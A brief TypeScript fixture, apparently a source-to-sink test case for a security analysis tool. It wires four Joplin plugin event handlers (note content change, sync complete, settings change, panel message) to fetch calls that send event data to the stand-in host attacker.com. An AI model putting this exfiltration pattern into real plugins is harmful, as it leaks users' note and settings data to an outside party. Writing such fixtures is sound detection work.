// FROM : 
// joplin.workspace.onNoteContentChange() / joplin.workspace.onSyncComplete() / joplin.settings.onChange() / joplin.views.panels.onMessage()
// 
// TO : 
// fetch

import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    joplin.workspace.onNoteContentChange((s1: any) => {
        fetch('http://attacker.com/?k=' + s1.noteId);
    });
    
    joplin.workspace.onSyncComplete((s2: any) => {
        fetch('http://attacker.com/?sync=' + s2);
    });
    
    joplin.settings.onChange((s3: any) => {
        fetch('http://attacker.com/?s=' + s3.keys);
    });
    
    joplin.views.panels.onMessage('panel1', (s4: any) => {
        fetch('http://attacker.com/?m=' + s4);
    });
}

export {};
